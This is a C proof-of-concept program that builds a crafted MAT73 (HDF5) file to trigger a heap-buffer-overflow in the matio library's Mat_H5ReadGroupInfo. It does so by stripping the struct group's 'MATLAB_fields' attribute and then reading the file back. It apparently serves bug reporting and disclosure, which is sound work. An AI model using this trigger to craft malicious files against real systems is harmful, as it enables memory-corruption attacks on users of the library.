/* PoC for heap-buffer-overflow in Mat_H5ReadGroupInfo (src/mat73.c).
 *
 * Builds a MAT73 (HDF5) file containing a scalar struct with two fields
 * using matio's public write API, then removes the "MATLAB_fields"
 * attribute from the struct's HDF5 group with the public HDF5 API so the
 * struct must have its fields enumerated by iterating the group's links
 * instead. Mat_Open + Mat_VarRead on the resulting file then exercises the
 * vulnerable field-enumeration path through matio's public read API.
 */
#include <hdf5.h>
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>

int
main(void)
{
    const char *path = "/tmp/newbug_struct.mat";
    const char *fields[3] = {"a", "b", NULL};
    size_t dims[2] = {1, 1};
    double va = 1.0, vb = 2.0;
    mat_t *mat;
    matvar_t *s, *fa, *fb, *r;
    hid_t file_id, grp_id;

    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT73);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_CreateVer failed\n");
        return 1;
    }

    s = Mat_VarCreateStruct2("s", 2, dims, fields);
    if ( NULL == s ) {
        fprintf(stderr, "Mat_VarCreateStruct2 failed\n");
        return 1;
    }

    fa = Mat_VarCreate("a", MAT_C_DOUBLE, MAT_T_DOUBLE, 2, dims, &va, 0);
    fb = Mat_VarCreate("b", MAT_C_DOUBLE, MAT_T_DOUBLE, 2, dims, &vb, 0);
    Mat_VarSetStructFieldByName(s, "a", 0, fa);
    Mat_VarSetStructFieldByName(s, "b", 0, fb);

    Mat_VarWrite(mat, s, MAT_COMPRESSION_NONE);
    Mat_VarFree(s);
    Mat_Close(mat);

    /* Remove MATLAB_fields so the struct's fields are no longer listed
     * explicitly and must be discovered by enumerating the group's links. */
    file_id = H5Fopen(path, H5F_ACC_RDWR, H5P_DEFAULT);
    grp_id = H5Gopen(file_id, "/s", H5P_DEFAULT);
    H5Adelete(grp_id, "MATLAB_fields");
    H5Gclose(grp_id);
    H5Fclose(file_id);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 1;
    }

    r = Mat_VarRead(mat, "s");
    Mat_VarFree(r);
    Mat_Close(mat);

    return 0;
}
